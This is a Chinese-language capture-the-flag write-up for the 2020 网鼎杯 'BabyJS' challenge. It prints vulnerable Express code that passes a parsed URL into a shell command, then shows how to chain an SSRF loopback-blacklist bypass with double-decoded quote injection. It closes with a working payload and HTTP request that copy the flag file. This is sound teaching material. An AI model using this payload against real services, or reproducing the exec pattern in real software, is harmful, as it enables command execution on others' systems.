# [网鼎杯 2020 半决赛]BabyJS

给出源码以及关键逻辑，并不算是特别复杂



```
var express = require('express');
var config = require('../config');
var url=require('url');
var child_process=require('child_process');
var fs=require('fs');
var request=require('request');
var router = express.Router();


var blacklist=['127.0.0.1.xip.io','::ffff:127.0.0.1','127.0.0.1','0','localhost','0.0.0.0','[::1]','::1'];

router.get('/', function(req, res, next) {
    res.json({});
});

router.get('/debug', function(req, res, next) {
    console.log(req.ip);
    if(blacklist.indexOf(req.ip)!=-1){
        console.log('res');
	var u=req.query.url.replace(/[\"\']/ig,'');
	console.log(url.parse(u).href);
	let log=`echo  '${url.parse(u).href}'>>/tmp/log`;
	console.log(log);
	child_process.exec(log);
	res.json({data:fs.readFileSync('/tmp/log').toString()});
    }else{
        res.json({});
    }
});


router.post('/debug', function(req, res, next) {
    console.log(req.body);
    if(req.body.url !== undefined) {
        var u = req.body.url;
	var urlObject=url.parse(u);
	if(blacklist.indexOf(urlObject.hostname) == -1){
		var dest=urlObject.href;
		request(dest,(err,result,body)=>{
			res.json(body);
		})
	}
	else{
		res.json([]);
	}
	}
});

module.exports = router;
```

正常路径下返回一个空的json文件，然后/debug路径下分为POST和GET两种请求。能看见POST请求下有一个url.parse()函数

```
使用 url.parse()方法将路径解析为一个方便操作的对象。
第二个参数为 true 表示直接将查询字符串转为一个对象（通过query属性来访问），默认第二个参数为false。
```

POST里面的逻辑大概接受用户传来的数据，然后经过url.parse，判断是否在黑名单中出现，是的话返回空，否则的话将产生的结果继续请求，相当于进了/debug的GET部分。

GET里的逻辑是如果是本地访问就读取get参数中的url参数，去除其中的单引号和双引号，然后用nodejs的url.parse去解析。把解析后的url拼接到一条shell命令中执行。之后返回/tmp/log文件中的内容。

大致的逻辑链就能拟出。



```
黑名单过滤的127.0.0.1实际上没啥作用，因为例如127.0.0.2，甚至127.0.0.1到127.255.255.254都属于本地回环网络

@前，也就是URL中表示用户名和密码的字段会被二次解码
http://%2527@xx这样的东西能够绕过单双引号的限制

最后的poc
{"url":"http://127.0.0.2:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00"}
拼接一下看看：
echo  'http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00'>>/tmp/log
;表示隔开命令，%00截断了后续的重定向符号
```

最终：

```
POST /debug HTTP/1.1

Host: c1d73d87-dac2-4a5a-9fca-cf868ae144aa.node4.buuoj.cn

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Content-Type: application/json

Cookie: UM_distinctid=17b0a55a0d936f-00af545b3ada28-31634645-410100-17b0a55a0da10; session=eyJhZG1pbiI6Im5vIn0=; session.sig=XE3E3dxGe4xLwivd7_2AbjNcdIU

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0

Content-Length: 85



{"url":"http://127.0.0.2:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00"}
```

